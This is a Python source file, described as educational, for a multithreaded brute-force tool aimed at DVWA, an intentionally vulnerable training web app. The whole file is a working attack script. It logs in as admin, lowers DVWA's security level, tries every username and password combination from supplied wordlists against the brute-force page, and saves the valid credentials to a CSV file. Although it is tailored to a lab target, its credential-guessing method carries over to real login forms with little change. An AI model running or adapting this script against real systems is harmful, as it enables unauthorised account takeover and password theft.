#!/usr/bin/env python3
"""DVWA Brute Force - Script educativo"""
import requests
import re
import time
import csv
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

class DVWABruteForce:
    def __init__(self, base_url, admin_user, admin_pass, users_file, pwds_file, 
                 threads=10, verbose=False):
        self.base_url = base_url.rstrip('/')
        self.brute_url = urljoin(self.base_url, '/vulnerabilities/brute/')
        self.threads = threads
        self.verbose = verbose
        self.admin_user = admin_user
        self.admin_pass = admin_pass
        self.found = []
        
        with open(users_file) as f:
            self.users = [line.strip() for line in f if line.strip()]
        with open(pwds_file) as f:
            self.pwds = [line.strip() for line in f if line.strip()]
    
    def login(self):
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/91.0'
        
        login_url = urljoin(self.base_url, '/login.php')
        r = self.session.get(login_url)
        token = re.search(r"name=['\"]user_token['\"] value=['\"]([^'\"]+)", r.text)
        
        data = {'username': self.admin_user, 'password': self.admin_pass, 'Login': 'Login'}
        if token:
            data['user_token'] = token.group(1)
        
        self.session.post(login_url, data=data)
        self.session.post(urljoin(self.base_url, '/security.php'), 
                         data={'security': 'low', 'seclev_submit': 'Submit'})
        
        return 'logout' in self.session.get(self.brute_url).text.lower()
    
    def _check_credentials(self, username, password):
        r = self.session.get(self.brute_url, 
                            params={'username': username, 'password': password, 'Login': 'Login'})
        
        body = r.text.lower()
        if 'username and/or password incorrect' in body:
            success = False
        elif 'welcome to the password protected area' in body:
            success = True
        else:
            success = False
        
        if self.verbose:
            status = "✓" if success else "✗"
            print(f"[{status}] {username}:{password}")
        
        return (username, password, success, r.status_code, len(r.text))
    
    def attack(self):
        if not self.login():
            print("[ERROR] Autenticación fallida")
            return []
        
        total = len(self.users) * len(self.pwds)
        print(f"[*] Buscando pares válidos ({total} combinaciones)...")
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._check_credentials, u, p) 
                      for u in self.users for p in self.pwds]
            
            for future in as_completed(futures):
                user, pwd, success, code, length = future.result()
                if success:
                    print(f"[+] Credencial válida encontrada")
                    self.found.append((user, pwd, code, length))
        
        elapsed = time.time() - start
        print(f"\n{'='*50}")
        print(f"Tiempo: {elapsed:.2f}s | Velocidad: {total/elapsed:.0f} req/s")
        print(f"Pares válidos encontrados: {len(self.found)}/{total}")
        print(f"{'='*50}")
        
        # Mostrar credenciales al final
        if self.found:
            print(f"\n[CREDENCIALES VÁLIDAS]")
            for i, (user, pwd, _, _) in enumerate(self.found, 1):
                print(f"  {i}. {user}:{pwd}")
            print()
        
        return self.found
    
    def save_results(self, output_file):
        with open(output_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Username', 'Password', 'Status_Code', 'Response_Length'])
            for user, pwd, code, length in self.found:
                writer.writerow([user, pwd, code, length])
        print(f"[+] Resultados guardados en: {output_file}")

def main():
    parser = argparse.ArgumentParser(
        description='DVWA Brute Force Tool - Educational Purpose Only'
    )
    parser.add_argument('--url', required=True, help='URL base de DVWA')
    parser.add_argument('--admin-user', required=True, help='Usuario admin')
    parser.add_argument('--admin-pass', required=True, help='Password admin')
    parser.add_argument('--users', required=True, help='Lista de usuarios')
    parser.add_argument('--pwds', required=True, help='Lista de contraseñas')
    parser.add_argument('--threads', type=int, default=10, help='Threads (default: 10)')
    parser.add_argument('--verbose', action='store_true', help='Mostrar todos los intentos')
    parser.add_argument('--out', default='results.csv', help='Archivo de salida')
    args = parser.parse_args()
    
    brute = DVWABruteForce(args.url, args.admin_user, args.admin_pass,
                           args.users, args.pwds, args.threads, args.verbose)
    brute.attack()
    brute.save_results(args.out)

if __name__ == '__main__':
    main()